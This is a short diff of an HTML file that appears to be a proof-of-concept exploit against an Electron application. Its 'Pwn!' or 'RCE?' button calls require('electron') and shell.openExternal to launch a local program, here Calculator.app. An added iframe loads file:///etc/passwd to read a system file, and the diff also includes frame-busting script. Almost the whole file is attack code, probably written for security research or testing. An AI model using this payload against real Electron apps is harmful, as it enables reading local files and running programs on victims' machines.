@@ -1,7 +1,17 @@
-<button onclick=pwn()>Pwn!</button>
+<style id="antiClickjack">body{display:none !important;}</style>
+<iframe src="file:///etc/passwd">
+<button onclick=pwn()>RCE?</button>
+<script type="text/javascript">
+   if (self === top) {
+       var antiClickjack = document.getElementById("antiClickjack");
+       antiClickjack.parentNode.removeChild(antiClickjack);
+   } else {
+       top.location = self.location;
+   }
+</script>
 <script>
-	const {shell} = require('electron');
 	function pwn() {
+		const {shell} = require('electron');
 		shell.openExternal('file:///Applications/Calculator.app');
 	}
 </script>
